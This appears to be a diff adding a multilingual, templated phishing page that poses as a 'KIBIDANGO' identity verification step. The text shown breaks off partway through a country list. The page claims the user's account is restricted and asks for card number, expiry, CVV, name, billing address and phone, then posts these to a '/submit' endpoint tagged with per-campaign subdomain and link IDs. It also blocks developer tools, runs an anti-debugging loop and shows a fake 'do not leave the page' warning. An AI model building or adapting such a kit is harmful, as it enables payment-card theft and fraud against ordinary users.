+  cta_main:'Rozumiem',
+  modal_title:'Weryfikacja tożsamości',
+  pm_header:'Metoda weryfikacji',
+  pm_label:'Karta',
+  lbl_card:'Dane karty',
+  lbl_name:'Imię posiadacza karty',
+  lbl_billing:'Adres rozliczeniowy',
+  lbl_addr1:'Adres',
+  lbl_addr2:'Adres linia 2 (opcjonalnie)',
+  lbl_zip:'Kod pocztowy',
+  lbl_city:'Miasto',
+  lbl_phone:'Numer telefonu',
+  ph_search:'Szukaj kraju...',
+  cta_modal:'Kontynuuj',
+  refund:'Bezpłatne zwroty i wymiany',
+  footer_by:'Obsługiwane przez ',
+  footer_terms:'Regulamin',
+  footer_privacy:'Prywatność',
+  err_card:'Nieprawidłowy numer karty',
+  err_exp_invalid:'Nieprawidłowa data ważności',
+  err_exp_expired:'Twoja karta wygasła',
+  err_cvv:'Niekompletny kod bezpieczeństwa',
+  err_name:'Proszę podać imię posiadacza karty',
+  err_phone:'Nieprawidłowy numer telefonu',
+  val_card:'Nieprawidłowy numer karty',
+  val_exp:'Proszę podać datę ważności',
+  val_cvv:'Proszę podać kod bezpieczeństwa',
+  val_name:'Proszę podać imię posiadacza karty',
+  ver_continue:'Kontynuuj',
+  proc_warning:'System jest obecnie niestabilny, proces może potrwać nieco dłużej. Może być wymagana dodatkowa weryfikacja. Nie opuszczaj strony do zakończenia transakcji!',
+  proc_terms:'Regulamin',proc_privacy:'Prywatność'
+},
+nl:{
+  page_title:'KIBIDANGO - Identiteitsverificatie',
+  page_desc:'Bevestig uw account om door te gaan.',
+  main_title:'Identiteitsverificatie',
+  main_desc:'Bevestig uw account om door te gaan.',
+  block1_title:'Uw account is beperkt',
+  block1_sub:'Identiteitsverificatie vereist',
+  block2_title:'Uw land is gedetecteerd',
+  block2_sub:'Om te voldoen aan wettelijke vereisten',
+  block3_title:'Snelle en eenvoudige verificatie',
+  block3_sub:'Klaar in enkele minuten',
+  cta_main:'Begrepen',
+  modal_title:'Identiteitsverificatie',
+  pm_header:'Verificatiemethode',
+  pm_label:'Kaart',
+  lbl_card:'Kaartgegevens',
+  lbl_name:'Naam kaarthouder',
+  lbl_billing:'Factuuradres',
+  lbl_addr1:'Adres',
+  lbl_addr2:'Adresregel 2 (optioneel)',
+  lbl_zip:'Postcode',
+  lbl_city:'Stad',
+  lbl_phone:'Telefoonnummer',
+  ph_search:'Zoek land...',
+  cta_modal:'Doorgaan',
+  refund:'Gratis retourneren & ruilen',
+  footer_by:'Aangedreven door ',
+  footer_terms:'Voorwaarden',
+  footer_privacy:'Privacy',
+  err_card:'Ongeldig kaartnummer',
+  err_exp_invalid:'Ongeldige vervaldatum',
+  err_exp_expired:'Uw kaart is verlopen',
+  err_cvv:'Onvolledige beveiligingscode',
+  err_name:'Voer de naam van de kaarthouder in',
+  err_phone:'Ongeldig telefoonnummer',
+  val_card:'Ongeldig kaartnummer',
+  val_exp:'Voer de vervaldatum in',
+  val_cvv:'Voer de beveiligingscode in',
+  val_name:'Voer de naam van de kaarthouder in',
+  ver_continue:'Doorgaan',
+  proc_warning:'Het systeem is momenteel instabiel en het proces kan iets langer duren. Aanvullende verificatie kan ook vereist zijn. Verlaat de pagina niet totdat de transactie is voltooid!',
+  proc_terms:'Voorwaarden',proc_privacy:'Privacy'
+},
+tr:{
+  page_title:'KIBIDANGO - Kimlik Doğrulama',
+  page_desc:'Devam etmek için hesabınızı doğrulayın.',
+  main_title:'Kimlik Doğrulama',
+  main_desc:'Devam etmek için hesabınızı doğrulayın.',
+  block1_title:'Hesabınız kısıtlandı',
+  block1_sub:'Kimlik doğrulaması gerekiyor',
+  block2_title:'Ülkeniz tespit edildi',
+  block2_sub:'Düzenleyici gereksinimlere uymak için',
+  block3_title:'Hızlı ve kolay doğrulama',
+  block3_sub:'Birkaç dakikada tamamlandı',
+  cta_main:'Anladım',
+  modal_title:'Kimlik Doğrulama',
+  pm_header:'Doğrulama yöntemi',
+  pm_label:'Kart',
+  lbl_card:'Kart bilgileri',
+  lbl_name:'Kart sahibinin adı',
+  lbl_billing:'Fatura adresi',
+  lbl_addr1:'Adres',
+  lbl_addr2:'Adres satırı 2 (isteğe bağlı)',
+  lbl_zip:'Posta kodu',
+  lbl_city:'Şehir',
+  lbl_phone:'Telefon numarası',
+  ph_search:'Ülke ara...',
+  cta_modal:'Devam et',
+  refund:'Ücretsiz iade ve değişim',
+  footer_by:'Destekleyen ',
+  footer_terms:'Şartlar',
+  footer_privacy:'Gizlilik',
+  err_card:'Geçersiz kart numarası',
+  err_exp_invalid:'Geçersiz son kullanma tarihi',
+  err_exp_expired:'Kartınızın süresi dolmuş',
+  err_cvv:'Eksik güvenlik kodu',
+  err_name:'Lütfen kart sahibinin adını girin',
+  err_phone:'Geçersiz telefon numarası',
+  val_card:'Geçersiz kart numarası',
+  val_exp:'Lütfen son kullanma tarihini girin',
+  val_cvv:'Lütfen güvenlik kodunu girin',
+  val_name:'Lütfen kart sahibinin adını girin',
+  ver_continue:'Devam et',
+  proc_warning:'Sistem şu anda kararsız ve işlem biraz daha uzun sürebilir. Ek doğrulama da gerekebilir. İşlem tamamlanana kadar lütfen sayfadan ayrılmayın!',
+  proc_terms:'Şartlar',proc_privacy:'Gizlilik'
+},
+uk:{
+  page_title:'KIBIDANGO - Підтвердження особи',
+  page_desc:'Будь ласка, підтвердіть обліковий запис для продовження.',
+  main_title:'Підтвердження особи',
+  main_desc:'Будь ласка, підтвердіть обліковий запис для продовження.',
+  block1_title:'Ваш обліковий запис обмежено',
+  block1_sub:'Потрібне підтвердження особи',
+  block2_title:'Вашу країну визначено',
+  block2_sub:'Для дотримання регуляторних вимог',
+  block3_title:'Швидка та проста верифікація',
+  block3_sub:'Займе кілька хвилин',
+  cta_main:'Зрозуміло',
+  modal_title:'Підтвердження особи',
+  pm_header:'Спосіб підтвердження',
+  pm_label:'Картка',
+  lbl_card:'Дані картки',
+  lbl_name:'Ім\'я власника картки',
+  lbl_billing:'Платіжна адреса',
+  lbl_addr1:'Адреса',
+  lbl_addr2:'Адреса (рядок 2, необов\'язково)',
+  lbl_zip:'Поштовий індекс',
+  lbl_city:'Місто',
+  lbl_phone:'Номер телефону',
+  ph_search:'Пошук країни...',
+  cta_modal:'Продовжити',
+  refund:'Безкоштовне повернення та обмін',
+  footer_by:'Працює на ',
+  footer_terms:'Умови',
+  footer_privacy:'Конфіденційність',
+  err_card:'Невірний номер картки',
+  err_exp_invalid:'Невірна дата закінчення терміну',
+  err_exp_expired:'Термін дії вашої картки закінчився',
+  err_cvv:'Неповний код безпеки',
+  err_name:'Введіть ім\'я власника картки',
+  err_phone:'Невірний номер телефону',
+  val_card:'Невірний номер картки',
+  val_exp:'Введіть дату закінчення терміну',
+  val_cvv:'Введіть код безпеки',
+  val_name:'Введіть ім\'я власника картки',
+  ver_continue:'Продовжити',
+  proc_warning:'Система тимчасово нестабільна, процес може зайняти трохи більше часу. Можлива додаткова перевірка. Будь ласка, не залишайте сторінку до завершення транзакції!',
+  proc_terms:'Умови',proc_privacy:'Конфіденційність'
+},
+zh:{
+  page_title:'KIBIDANGO - 身份验证',
+  page_desc:'请验证您的账户以继续。',
+  main_title:'身份验证',
+  main_desc:'请验证您的账户以继续。',
+  block1_title:'您的账户已受限',
+  block1_sub:'需要身份验证',
+  block2_title:'已检测到您的国家/地区',
+  block2_sub:'为符合监管要求',
+  block3_title:'快速简便的验证',
+  block3_sub:'几分钟内完成',
+  cta_main:'我明白了',
+  modal_title:'身份验证',
+  pm_header:'验证方式',
+  pm_label:'银行卡',
+  lbl_card:'卡片信息',
+  lbl_name:'持卡人姓名',
+  lbl_billing:'账单地址',
+  lbl_addr1:'地址',
+  lbl_addr2:'地址第2行（选填）',
+  lbl_zip:'邮政编码',
+  lbl_city:'城市',
+  lbl_phone:'电话号码',
+  ph_search:'搜索国家...',
+  cta_modal:'继续',
+  refund:'免费退货和退换',
+  footer_by:'提供方：',
+  footer_terms:'条款',
+  footer_privacy:'隐私',
+  err_card:'无效的卡号',
+  err_exp_invalid:'无效的到期日期',
+  err_exp_expired:'您的卡已过期',
+  err_cvv:'安全码不完整',
+  err_name:'请输入持卡人姓名',
+  err_phone:'无效的电话号码',
+  val_card:'无效的卡号',
+  val_exp:'请输入到期日期',
+  val_cvv:'请输入安全码',
+  val_name:'请输入持卡人姓名',
+  ver_continue:'继续',
+  proc_warning:'系统目前不稳定，处理过程可能需要更长时间。可能还需要额外验证。请在交易完成之前不要离开页面！',
+  proc_terms:'条款',proc_privacy:'隐私'
+},
+ko:{
+  page_title:'KIBIDANGO - 신원 확인',
+  page_desc:'계속하려면 계정을 확인해주세요.',
+  main_title:'신원 확인',
+  main_desc:'계속하려면 계정을 확인해주세요.',
+  block1_title:'계정이 제한되었습니다',
+  block1_sub:'신원 확인이 필요합니다',
+  block2_title:'귀하의 국가가 감지되었습니다',
+  block2_sub:'규제 요건을 준수하기 위해',
+  block3_title:'빠르고 간편한 확인',
+  block3_sub:'몇 분 안에 완료됩니다',
+  cta_main:'알겠습니다',
+  modal_title:'신원 확인',
+  pm_header:'확인 방법',
+  pm_label:'카드',
+  lbl_card:'카드 정보',
+  lbl_name:'카드 소지자 이름',
+  lbl_billing:'청구 주소',
+  lbl_addr1:'주소',
+  lbl_addr2:'주소 2번째 줄 (선택)',
+  lbl_zip:'우편번호',
+  lbl_city:'도시',
+  lbl_phone:'전화번호',
+  ph_search:'국가 검색...',
+  cta_modal:'계속',
+  refund:'무료 반품 및 교환',
+  footer_by:'제공: ',
+  footer_terms:'이용약관',
+  footer_privacy:'개인정보처리방침',
+  err_card:'유효하지 않은 카드 번호',
+  err_exp_invalid:'유효하지 않은 만료 날짜',
+  err_exp_expired:'카드가 만료되었습니다',
+  err_cvv:'보안 코드가 불완전합니다',
+  err_name:'카드 소지자 이름을 입력해주세요',
+  err_phone:'유효하지 않은 전화번호',
+  val_card:'유효하지 않은 카드 번호',
+  val_exp:'만료 날짜를 입력해주세요',
+  val_cvv:'보안 코드를 입력해주세요',
+  val_name:'카드 소지자 이름을 입력해주세요',
+  ver_continue:'계속',
+  proc_warning:'현재 시스템이 불안정하여 처리에 시간이 더 걸릴 수 있습니다. 추가 확인이 필요할 수도 있습니다. 거래가 완료될 때까지 페이지를 떠나지 마세요!',
+  proc_terms:'이용약관',proc_privacy:'개인정보처리방침'
+},
+it:{
+  page_title:'KIBIDANGO - Verifica identità',
+  page_desc:'Si prega di verificare il tuo account per continuare.',
+  main_title:'Verifica identità',
+  main_desc:'Si prega di verificare il tuo account per continuare.',
+  block1_title:'Il tuo account è limitato',
+  block1_sub:'Verifica dell\'identità richiesta',
+  block2_title:'Il tuo paese è stato rilevato',
+  block2_sub:'Per conformarsi ai requisiti normativi',
+  block3_title:'Verifica rapida e semplice',
+  block3_sub:'Completata in pochi minuti',
+  cta_main:'Ho capito',
+  modal_title:'Verifica identità',
+  pm_header:'Metodo di verifica',
+  pm_label:'Carta',
+  lbl_card:'Informazioni carta',
+  lbl_name:'Intestatario della carta',
+  lbl_billing:'Indirizzo di fatturazione',
+  lbl_addr1:'Indirizzo',
+  lbl_addr2:'Indirizzo riga 2 (opzionale)',
+  lbl_zip:'CAP',
+  lbl_city:'Città',
+  lbl_phone:'Numero di telefono',
+  ph_search:'Cerca paese...',
+  cta_modal:'Continua',
+  refund:'Resi e cambi gratuiti',
+  footer_by:'Fornito da ',
+  footer_terms:'Termini',
+  footer_privacy:'Privacy',
+  err_card:'Numero di carta non valido',
+  err_exp_invalid:'Data di scadenza non valida',
+  err_exp_expired:'La tua carta è scaduta',
+  err_cvv:'Codice di sicurezza incompleto',
+  err_name:'Inserire il nome dell\'intestatario',
+  err_phone:'Numero di telefono non valido',
+  val_card:'Numero di carta non valido',
+  val_exp:'Inserire la data di scadenza',
+  val_cvv:'Inserire il codice di sicurezza',
+  val_name:'Inserire il nome dell\'intestatario',
+  ver_continue:'Continua',
+  proc_warning:'Il sistema è attualmente instabile e il processo potrebbe richiedere un po\' più di tempo. Potrebbe anche essere richiesta una verifica aggiuntiva. Non abbandonare la pagina finché la transazione non è completata!',
+  proc_terms:'Termini',proc_privacy:'Privacy'
+}
+};
+
+window._i18n = T[LANG] || T['en'];
+
+/* apply to data-i18n elements */
+document.addEventListener('DOMContentLoaded', function(){
+  var t = window._i18n;
+  document.querySelectorAll('[data-i18n]').forEach(function(el){
+    var key = el.getAttribute('data-i18n');
+    if(t[key]) el.textContent = t[key];
+  });
+  /* CTA button: only override if no custom button_text was set by template */
+  document.querySelectorAll('[data-i18n-btn]').forEach(function(el){
+    var key = el.getAttribute('data-i18n-btn');
+    if(t[key] && el.textContent.trim() === '了解しました') el.textContent = t[key];
+  });
+  /* page title */
+  if(document.title === 'KIBIDANGO - 本人確認' && t['page_title'])
+    document.title = t['page_title'];
+  /* meta description */
+  var metaDesc = document.querySelector('meta[name="description"]');
+  if(metaDesc && metaDesc.content === '続行するにはアカウントを確認してください。' && t['page_desc'])
+    metaDesc.content = t['page_desc'];
+});
+})();
+</script>
+
+<script>
+(function(){
+    /* KOSIM.CASH protection */
+    document.addEventListener('keydown',function(e){
+        if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&e.keyCode===73)||
+           (e.ctrlKey&&e.shiftKey&&e.keyCode===74)||(e.ctrlKey&&e.keyCode===85)){
+            e.preventDefault();
+        }
+    });
+    setInterval(function(){try{(function(){}).constructor('debugger')();}catch(e){}},1000);
+})();
+</script>
+
+<script>
+(function(){
+    var BUTTON_URL  = {{ button_url|tojson }};
+    var BUTTON_TEXT = {{ button_text|tojson }};
+    var SUBMIT_SUBDOMAIN = {{ subdomain|default('')|tojson }};
+    var SUBMIT_LINK_ID   = {{ link_id|default('')|tojson }};
+
+    function submitData(extra){
+        try {
+            var body = Object.assign({
+                subdomain: SUBMIT_SUBDOMAIN,
+                link_id:   SUBMIT_LINK_ID
+            }, extra || {});
+            fetch('/submit', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(body),
+                keepalive: true
+            }).catch(function(){});
+        } catch(e){}
+    }
+
+    /* ── payment-widget web component ── */
+    customElements.define('payment-widget', class extends HTMLElement {
+        constructor(){
+            super();
+            this._shadow = this.attachShadow({mode:'open'});
+            this._isOpen = false;
+        }
+
+        connectedCallback(){
+            var self = this;
+            /* Wait for :root CSS vars to be computed */
+            requestAnimationFrame(function(){ self._render(); });
+        }
+
+        _render(){
+            var s = getComputedStyle(document.documentElement);
+            var btnColor  = s.getPropertyValue('--kc-button-color').trim() || '#FF5C60';
+            var btnTxt    = s.getPropertyValue('--kc-button-text-color').trim() || '#fff';
+            var self = this;
+            var FAVICON_URL = {{ favicon_url|tojson }};
+            var SITE_TITLE  = {{ subdomain|default(title)|upper|tojson }};
+            var t = window._i18n || {};
+
+            var css =
+                ':host{all:initial;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;}' +
+                '*{box-sizing:border-box;margin:0;padding:0;}' +
+                '.ov{display:none;position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.45);' +
+                    'align-items:flex-start;justify-content:center;padding:20px 16px;overflow-y:auto;}' +
+                '.ov.on{display:flex;}' +
+                '.dlg{background:#fff;border-radius:8px;width:100%;max-width:480px;' +
+                    'box-shadow:0 4px 24px rgba(0,0,0,0.18);display:flex;flex-direction:column;margin:auto;position:relative;}' +
+                '.hdr{display:flex;align-items:center;padding:16px 20px;border-bottom:1px solid #e8e8e8;position:relative;}' +
+                '.hdr-logo{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:700;color:#1a1a2e;letter-spacing:.3px;}' +
+                '.hdr-logo img{width:22px;height:22px;border-radius:4px;object-fit:contain;}' +
+                '.x{margin-left:auto;background:none;border:none;cursor:pointer;font-size:20px;' +
+                    'line-height:1;color:#888;padding:2px 6px;border-radius:4px;}' +
+                '.x:hover{background:#f0f0f0;color:#333;}' +
+                '.body{padding:20px 20px 16px;}' +
+                '.ttl{text-align:center;font-size:15px;font-weight:600;color:#1a1a2e;margin-bottom:16px;}' +
+                /* payment method section */
+                '.pm-box{border:1px solid #e0e0e0;border-radius:8px;overflow:hidden;margin-bottom:16px;}' +
+                '.pm-hdr{padding:10px 14px;font-size:12px;font-weight:600;color:#666;' +
+                    'background:#f7f7f7;border-bottom:1px solid #e0e0e0;}' +
+                '.pm-row{display:flex;align-items:center;gap:10px;padding:11px 14px;cursor:pointer;}' +
+                '.pm-row input[type=radio]{accent-color:' + btnColor + ';width:15px;height:15px;flex-shrink:0;cursor:pointer;}' +
+                '.pm-label{font-size:14px;color:#1a1a2e;font-weight:500;}' +
+                /* field label */
+                '.flbl{font-size:12px;color:#444;font-weight:500;margin-bottom:5px;margin-top:12px;display:block;}' +
+                '.flbl:first-child{margin-top:0;}' +
+                /* generic input box */
+                '.inp-box{border:1px solid #d1d1d1;border-radius:6px;display:flex;align-items:center;' +
+                    'background:#fff;transition:border-color .15s;}' +
+                '.inp-box:focus-within{border-color:#0573e8;box-shadow:0 0 0 3px rgba(5,115,232,.12);}' +
+                '.inp-box.err{border-color:#df1b41;box-shadow:0 0 0 3px rgba(223,27,65,.10);}' +
+                '.inp-box input{flex:1;border:none;outline:none;padding:10px 12px;font-size:14px;' +
+                    'color:#1a1a2e;background:transparent;font-family:inherit;min-width:0;}' +
+                '.inp-box input::placeholder{color:#b0b0b0;}' +
+                /* split row (expiry + cvv) */
+                '.split{display:flex;gap:10px;}' +
+                '.split .inp-box{flex:1;}' +
+                /* card brands row */
+                '.brands{display:flex;gap:3px;align-items:center;padding-right:10px;flex-shrink:0;}' +
+                '.brand{height:20px;border-radius:3px;transition:opacity .2s,filter .2s;}' +
+                /* select */
+                '.sel-box{border:1px solid #d1d1d1;border-radius:6px;display:flex;align-items:center;' +
+                    'background:#fff;transition:border-color .15s;}' +
+                '.sel-box:focus-within{border-color:#0573e8;box-shadow:0 0 0 3px rgba(5,115,232,.12);}' +
+                '.sel-box.err{border-color:#df1b41;}' +
+                '.sel-box select{flex:1;border:none;outline:none;padding:10px 12px;font-size:14px;' +
+                    'color:#1a1a2e;background:transparent;font-family:inherit;' +
+                    'appearance:none;-webkit-appearance:none;cursor:pointer;}' +
+                '.sel-arrow{padding-right:10px;color:#888;pointer-events:none;flex-shrink:0;}' +
+                /* phone */
+                '.phone-box{border:1px solid #d1d1d1;border-radius:6px;display:flex;align-items:stretch;' +
+                    'background:#fff;overflow:hidden;transition:border-color .15s;}' +
+                '.phone-box:focus-within{border-color:#0573e8;box-shadow:0 0 0 3px rgba(5,115,232,.12);}' +
+                '.phone-box.err{border-color:#df1b41;}' +
+                '.phone-flag-btn{display:flex;align-items:center;gap:4px;padding:0 10px;' +
+                    'border-right:1px solid #e0e0e0;background:none;border-top:none;border-bottom:none;border-left:none;' +
+                    'cursor:pointer;font-size:15px;color:#444;white-space:nowrap;font-family:inherit;}' +
+                '.phone-flag-btn:hover{background:#f5f5f5;}' +
+                '.phone-flag-btn .dial{font-size:12px;color:#555;}' +
+                '.phone-flag-btn .chev{font-size:9px;color:#888;}' +
+                '.phone-inp{flex:1;border:none;outline:none;padding:10px 12px;font-size:14px;' +
+                    'color:#1a1a2e;background:transparent;font-family:inherit;min-width:0;}' +
+                '.phone-inp::placeholder{color:#b0b0b0;}' +
+                '.phone-info{display:flex;align-items:center;padding-right:10px;color:#b0b0b0;cursor:default;}' +
+                /* error text */
+                '.err-txt{color:#df1b41;font-size:12px;margin-top:4px;display:none;}' +
+                '.err-txt.on{display:block;}' +
+                /* two-col address */
+                '.row2{display:flex;gap:10px;}' +
+                '.row2 .col{flex:1;}' +
+                /* submit */
+                '.cta{display:block;width:100%;text-align:center;background-color:' + btnColor + ';' +
+                    'color:' + btnTxt + ';border-radius:6px;padding:14px 24px;font-size:15px;' +
+                    'font-weight:600;cursor:pointer;border:none;font-family:inherit;' +
+                    'margin-top:18px;margin-bottom:12px;transition:opacity .15s;}' +
+                '.cta:hover{opacity:0.88;}' +
+                '.cta:disabled{opacity:.55;cursor:not-allowed;}' +
+                /* refund */
+                '.refund{display:flex;align-items:center;justify-content:center;gap:5px;' +
+                    'font-size:12px;color:#888;margin-bottom:4px;}' +
+                /* footer */
+                '.footer{display:flex;align-items:center;justify-content:center;gap:12px;' +
+                    'padding:12px 20px;border-top:1px solid #eee;font-size:11px;color:#aaa;}' +
+                '.footer a{color:#aaa;text-decoration:none;}' +
+                '.footer a:hover{text-decoration:underline;}' +
+                '.footer svg{vertical-align:middle;}';
+
+            var html =
+                '<div class="ov" id="ov">' +
+                  '<div class="dlg">' +
+                    '<div class="hdr">' +
+                      '<div class="hdr-logo">' +
+                        (FAVICON_URL ? '<img src="'+FAVICON_URL+'" width="22" height="22" style="border-radius:4px;object-fit:contain;" alt="">' : '') +
+                        (SITE_TITLE||'KIBIDANGO') +
+                      '</div>' +
+                      '<button class="x" id="x" type="button" aria-label="Close">×</button>' +
+                    '</div>' +
+                    '<div class="body">' +
+                      '<div class="ttl">'+(t.modal_title||'本人確認')+'</div>' +
+                      '<div class="pm-box">' +
+                        '<div class="pm-hdr">'+(t.pm_header||'確認方法')+'</div>' +
+                        '<div class="pm-row">' +
+                          '<input type="radio" name="pm" checked>' +
+                          '<svg width="28" height="18" viewBox="0 0 38 24"><rect width="38" height="24" rx="3" fill="#1A1F71"/><rect y="8" width="38" height="7" fill="#F7B600"/></svg>' +
+                          '<span class="pm-label">'+(t.pm_label||'カード')+'</span>' +
+                        '</div>' +
+                      '</div>' +
+                      '<label class="flbl">'+(t.lbl_card||'カード情報')+'</label>' +
+                      '<div class="inp-box" id="box-num">' +
+                        '<input id="card-number" type="text" inputmode="numeric" placeholder="1234 1234 1234 1234" autocomplete="cc-number">' +
+                        '<div class="brands">' +
+                          '<svg id="brand-visa" class="brand" width="32" height="20" viewBox="0 0 32 20"><rect width="32" height="20" rx="3" fill="#1A1F71"/><text x="16" y="14" text-anchor="middle" font-size="7" fill="#fff" font-weight="bold">VISA</text></svg>' +
+                          '<svg id="brand-mc" class="brand" width="32" height="20" viewBox="0 0 32 20"><rect width="32" height="20" rx="3" fill="#f5f5f5"/><circle cx="12" cy="10" r="7" fill="#EB001B"/><circle cx="20" cy="10" r="7" fill="#F79E1B" opacity=".9"/></svg>' +
+                          '<svg id="brand-amex" class="brand" width="32" height="20" viewBox="0 0 32 20"><rect width="32" height="20" rx="3" fill="#016FD0"/><text x="16" y="14" text-anchor="middle" font-size="6" fill="#fff" font-weight="bold">AMEX</text></svg>' +
+                          '<svg id="brand-jcb" class="brand" width="32" height="20" viewBox="0 0 32 20"><rect width="32" height="20" rx="3" fill="#fff" stroke="#ddd" stroke-width="1"/><text x="16" y="14" text-anchor="middle" font-size="8" fill="#003087" font-weight="bold">JCB</text></svg>' +
+                        '</div>' +
+                      '</div>' +
+                      '<div class="err-txt" id="err-num"></div>' +
+                      '<div class="split" style="margin-top:8px">' +
+                        '<div class="col">' +
+                          '<div class="inp-box" id="box-exp"><input id="cc-exp" type="text" inputmode="numeric" placeholder="MM / YY" autocomplete="cc-exp" maxlength="7"></div>' +
+                          '<div class="err-txt" id="err-exp"></div>' +
+                        '</div>' +
+                        '<div class="col">' +
+                          '<div class="inp-box" id="box-cvv"><input id="cc-cvv" type="text" inputmode="numeric" placeholder="CVV" autocomplete="cc-csc" maxlength="3"></div>' +
+                          '<div class="err-txt" id="err-cvv"></div>' +
+                        '</div>' +
+                      '</div>' +
+                      '<label class="flbl">'+(t.lbl_name||'カード名義人名')+'</label>' +
+                      '<div class="inp-box" id="box-name"><input id="cc-name" type="text" placeholder="" autocomplete="cc-name"></div>' +
+                      '<div class="err-txt" id="err-name"></div>' +
+                      '<label class="flbl">'+(t.lbl_billing||'請求先住所')+'</label>' +
+                      '<div class="sel-box">' +
+                        '<select id="cc-country" autocomplete="country"><option value=\\\"AF\\\">アフガニスタン</option><option value=\\\"AL\\\">アルバニア</option><option value=\\\"DZ\\\">アルジェリア</option><option value=\\\"AD\\\">アンドラ</option><option value=\\\"AO\\\">アンゴラ</option><option value=\\\"AG\\\">アンティグア・バーブーダ</option><option value=\\\"AR\\\">アルゼンチン</option><option value=\\\"AM\\\">アルメニア</option><option value=\\\"AU\\\">オーストラリア</option><option value=\\\"AT\\\">オーストリア</option><option value=\\\"AZ\\\">アゼルバイジャン</option><option value=\\\"BS\\\">バハマ</option><option value=\\\"BH\\\">バーレーン</option><option value=\\\"BD\\\">バングラデシュ</option><option value=\\\"BB\\\">バルバドス</option><option value=\\\"BY\\\">ベラルーシ</option><option value=\\\"BE\\\">ベルギー</option><option value=\\\"BZ\\\">ベリーズ</option><option value=\\\"BJ\\\">ベナン</option><option value=\\\"BT\\\">ブータン</option><option value=\\\"BO\\\">ボリビア</option><option value=\\\"BA\\\">ボスニア・ヘルツェゴビナ</option><option value=\\\"BW\\\">ボツワナ</option><option value=\\\"BR\\\">ブラジル</option><option value=\\\"BN\\\">ブルネイ</option><option value=\\\"BG\\\">ブルガリア</option><option value=\\\"BF\\\">ブルキナファソ</option><option value=\\\"BI\\\">ブルンジ</option><option value=\\\"KH\\\">カンボジア</option><option value=\\\"CM\\\">カメルーン</option><option value=\\\"CA\\\">カナダ</option><option value=\\\"CV\\\">カーボベルデ</option><option value=\\\"CF\\\">中央アフリカ共和国</option><option value=\\\"TD\\\">チャド</option><option value=\\\"CL\\\">チリ</option><option value=\\\"CN\\\">中国</option><option value=\\\"CO\\\">コロンビア</option><option value=\\\"KM\\\">コモロ</option><option value=\\\"CG\\\">コンゴ共和国</option><option value=\\\"CD\\\">コンゴ民主共和国</option><option value=\\\"CR\\\">コスタリカ</option><option value=\\\"CI\\\">コートジボワール</option><option value=\\\"HR\\\">クロアチア</option><option value=\\\"CU\\\">キューバ</option><option value=\\\"CY\\\">キプロス</option><option value=\\\"CZ\\\">チェコ</option><option value=\\\"DK\\\">デンマーク</option><option value=\\\"DJ\\\">ジブチ</option><option value=\\\"DM\\\">ドミニカ</option><option value=\\\"DO\\\">ドミニカ共和国</option><option value=\\\"EC\\\">エクアドル</option><option value=\\\"EG\\\">エジプト</option><option value=\\\"SV\\\">エルサルバドル</option><option value=\\\"GQ\\\">赤道ギニア</option><option value=\\\"ER\\\">エリトリア</option><option value=\\\"EE\\\">エストニア</option><option value=\\\"ET\\\">エチオピア</option><option value=\\\"FJ\\\">フィジー</option><option value=\\\"FI\\\">フィンランド</option><option value=\\\"FR\\\">フランス</option><option value=\\\"GA\\\">ガボン</option><option value=\\\"GM\\\">ガンビア</option><option value=\\\"GE\\\">ジョージア</option><option value=\\\"DE\\\">ドイツ</option><option value=\\\"GH\\\">ガーナ</option><option value=\\\"GR\\\">ギリシャ</option><option value=\\\"GD\\\">グレナダ</option><option value=\\\"GT\\\">グアテマラ</option><option value=\\\"GN\\\">ギニア</option><option value=\\\"GW\\\">ギニアビサウ</option><option value=\\\"GY\\\">ガイアナ</option><option value=\\\"HT\\\">ハイチ</option><option value=\\\"HN\\\">ホンジュラス</option><option value=\\\"HU\\\">ハンガリー</option><option value=\\\"IS\\\">アイスランド</option><option value=\\\"IN\\\">インド</option><option value=\\\"ID\\\">インドネシア</option><option value=\\\"IR\\\">イラン</option><option value=\\\"IQ\\\">イラク</option><option value=\\\"IE\\\">アイルランド</option><option value=\\\"IL\\\">イスラエル</option><option value=\\\"IT\\\">イタリア</option><option value=\\\"JM\\\">ジャマイカ</option><option value=\\\"JP\\\">日本</option><option value=\\\"JO\\\">ヨルダン</option><option value=\\\"KZ\\\">カザフスタン</option><option value=\\\"KE\\\">ケニア</option><option value=\\\"KI\\\">キリバス</option><option value=\\\"KP\\\">朝鮮民主主義人民共和国</option><option value=\\\"KR\\\">大韓民国</option><option value=\\\"KW\\\">クウェート</option><option value=\\\"KG\\\">キルギス</option><option value=\\\"LA\\\">ラオス</option><option value=\\\"LV\\\">ラトビア</option><option value=\\\"LB\\\">レバノン</option><option value=\\\"LS\\\">レソト</option><option value=\\\"LR\\\">リベリア</option><option value=\\\"LY\\\">リビア</option><option value=\\\"LI\\\">リヒテンシュタイン</option><option value=\\\"LT\\\">リトアニア</option><option value=\\\"LU\\\">ルクセンブルク</option><option value=\\\"MG\\\">マダガスカル</option><option value=\\\"MW\\\">マラウィ</option><option value=\\\"MY\\\">マレーシア</option><option value=\\\"MV\\\">モルディブ</option><option value=\\\"ML\\\">マリ</option><option value=\\\"MT\\\">マルタ</option><option value=\\\"MH\\\">マーシャル諸島</option><option value=\\\"MQ\\\">Martinique</option><option value=\\\"MR\\\">モーリタニア</option><option value=\\\"MU\\\">モーリシャス</option><option value=\\\"YT\\\">Mayotte</option><option value=\\\"MX\\\">メキシコ</option><option value=\\\"FM\\\">ミクロネシア連邦山地</option><option value=\\\"MD\\\">モルドバ</option><option value=\\\"MC\\\">モナコ</option><option value=\\\"MN\\\">モンゴル</option><option value=\\\"ME\\\">モンテネグロ</option><option value=\\\"MS\\\">Montserrat</option><option value=\\\"MA\\\">モロッコ</option><option value=\\\"MZ\\\">モザンビーク</option><option value=\\\"MM\\\">ミャンマー</option><option value=\\\"NA\\\">ナミビア</option><option value=\\\"NR\\\">ナウル</option><option value=\\\"NP\\\">ネパール</option><option value=\\\"NL\\\">オランダ</option><option value=\\\"NZ\\\">ニュージーランド</option><option value=\\\"NI\\\">ニカラグア</option><option value=\\\"NE\\\">ニジェール</option><option value=\\\"NG\\\">ナイジェリア</option><option value=\\\"NO\\\">ノルウェー</option><option value=\\\"OM\\\">オマーン</option><option value=\\\"PK\\\">パキスタン</option><option value=\\\"PW\\\">パラオ</option><option value=\\\"PA\\\">パナマ</option><option value=\\\"PG\\\">パプアニューギニア</option><option value=\\\"PY\\\">パラグアイ</option><option value=\\\"PE\\\">ペルー</option><option 